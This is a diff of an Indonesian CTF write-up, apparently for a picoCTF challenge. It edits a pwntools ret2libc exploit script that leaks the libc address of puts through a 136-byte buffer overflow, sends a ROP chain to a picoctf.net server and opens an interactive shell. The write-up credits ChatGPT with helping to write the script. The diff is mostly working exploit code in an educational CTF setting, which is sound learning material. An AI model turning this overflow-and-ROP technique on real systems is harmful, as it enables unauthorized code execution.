@@ -79,28 +79,23 @@ Saya dengan bantuan ChatGPT membuat script untuk eksploitasi.
 ```python
 from pwn import *
 
-binary = './vuln'  # Nama binary
+# Konfigurasi Binary dan Libc
+binary = './vuln_patched'  # Nama binary
 libc_path = './libc.so.6'  # Nama file libc
 elf = ELF(binary)
 libc = ELF(libc_path)
 
-# Alamat puts sama main
+# Alamat penting dari binary
 puts_plt = elf.plt['puts']
 puts_got = elf.got['puts']
 main_addr = elf.symbols['main']
 
+# Offset dari buffer overflow
 offset = 136
 
 # Remote server
 host = 'mercury.picoctf.net'
 port = 49464
-
-# Fungsi untuk memulai koneksi
-def start():
-    if args.REMOTE:
-        return remote(host, port)
-    else:
-        return process(binary, env={"LD_PRELOAD": libc_path})
 
 # Fungsi untuk leak alamat libc
 def leak_libc_address(proc, func_got):
@@ -138,12 +133,13 @@ def exploit(proc):
     payload = flat({offset: rop.chain()})
     proc.sendlineafter("WeLcOmE To mY EcHo sErVeR!", payload)
 
+    # Berikan akses interaktif
     proc.interactive()
 
+# Main program
 if __name__ == "__main__":
     context.binary = elf
-
-    p = start()
+    p = remote(host, port)
     exploit(p)
 ```
 
